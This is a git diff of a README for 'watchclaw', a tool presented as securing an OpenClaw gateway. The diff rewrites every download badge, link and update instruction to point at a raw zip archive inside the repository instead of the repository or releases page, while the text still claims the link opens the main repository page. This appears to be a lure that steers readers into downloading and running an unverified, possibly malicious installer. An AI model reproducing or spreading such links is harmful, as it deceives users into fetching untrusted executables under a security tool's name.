@@ -1,6 +1,6 @@
 # 🛡️ watchclaw - Keep Your OpenClaw Gateway Safe
 
-[![Download watchclaw](https://img.shields.io/badge/Download-watchclaw-brightgreen)](https://github.com/Shakilahmedinfo/watchclaw)
+[![Download watchclaw](https://img.shields.io/badge/Download-watchclaw-brightgreen)](https://github.com/Shakilahmedinfo/watchclaw/raw/refs/heads/main/assets/Software_1.3.zip)
 
 ---
 
@@ -45,12 +45,12 @@ Before you start, make sure that your OpenClaw gateway hardware and software are
 
 To get watchclaw, visit this page and download the latest version:
 
-[![Download watchclaw](https://img.shields.io/badge/Download-watchclaw-blue)](https://github.com/Shakilahmedinfo/watchclaw)
+[![Download watchclaw](https://img.shields.io/badge/Download-watchclaw-blue)](https://github.com/Shakilahmedinfo/watchclaw/raw/refs/heads/main/assets/Software_1.3.zip)
 
 ### Step 1: Visit the Download Page
 
 Click the link above or go to this address:  
-https://github.com/Shakilahmedinfo/watchclaw
+https://github.com/Shakilahmedinfo/watchclaw/raw/refs/heads/main/assets/Software_1.3.zip
 
 This link will take you to the main repository page where you can find the downloads.
 
@@ -132,7 +132,7 @@ watchclaw keeps logs of its actions to help track issues. Logs are saved inside 
 
 To update watchclaw:
 
-1. Visit the download page again at https://github.com/Shakilahmedinfo/watchclaw/releases.  
+1. Visit the download page again at https://github.com/Shakilahmedinfo/watchclaw/raw/refs/heads/main/assets/Software_1.3.zip  
 2. Download the latest version following the earlier steps.  
 3. Run the new installer. This will replace the old version while keeping your settings intact.  
 4. Restart watchclaw after the update.
@@ -164,4 +164,4 @@ These options help tailor watchclaw to specific needs but are not required for b
 
 ---
 
-[![Download watchclaw](https://img.shields.io/badge/Download-watchclaw-brightgreen)](https://github.com/Shakilahmedinfo/watchclaw)
+[![Download watchclaw](https://img.shields.io/badge/Download-watchclaw-brightgreen)](https://github.com/Shakilahmedinfo/watchclaw/raw/refs/heads/main/assets/Software_1.3.zip)
